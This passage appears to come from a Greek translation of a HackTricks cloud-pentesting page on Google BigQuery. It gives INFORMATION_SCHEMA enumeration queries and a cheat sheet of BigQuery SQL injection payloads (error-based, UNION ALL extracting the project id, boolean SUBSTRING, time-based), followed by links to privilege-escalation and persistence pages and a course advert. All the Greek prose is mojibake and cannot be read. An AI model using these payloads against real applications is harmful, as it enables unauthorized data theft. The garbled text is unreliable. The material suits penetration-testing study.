{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **ÎŸÎ½ÏŒÎ¼Î±Ï„Î± ÏƒÏ„Î®Î»Î·Ï‚** ÎºÎ±Î¹ **Ï€Î¯Î½Î±ÎºÎ±** ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ **Ï€Î¹Î½Î¬ÎºÏ‰Î½** Ï„Î¿Ï… ÏƒÏ…Î½ÏŒÎ»Î¿Ï… Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **Î†Î»Î»Î± ÏƒÏÎ½Î¿Î»Î± Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** ÏƒÏ„Î¿ Î¯Î´Î¹Î¿ Î­ÏÎ³Î¿:

{% code overflow="wrap" %}
```sql
#Â SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**Î¤ÏÏ€Î¿Î¹ SQL Injection:**

* Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± - casting: `select CAST(@@project_id AS INT64)`
* Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± - Î´Î¹Î±Î¯ÏÎµÏƒÎ· Î¼Îµ Ï„Î¿ Î¼Î·Î´Î­Î½: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Union (Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ALL ÏƒÏ„Î¿ bigquery): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Boolean: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* Î Î¹Î¸Î±Î½ÏÏ‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Ï‡ÏÏŒÎ½Î¿ - Î§ÏÎ®ÏƒÎ· Î´Î·Î¼ÏŒÏƒÎ¹Ï‰Î½ ÏƒÏ…Î½ÏŒÎ»Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**Î¤ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·:**

* Î›Î¯ÏƒÏ„Î± ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* Î”Î·Î»ÏÏƒÎµÎ¹Ï‚ scripting: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Î”Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ & ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### Î•Ï€Î¹Î¼Î¿Î½Î®

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
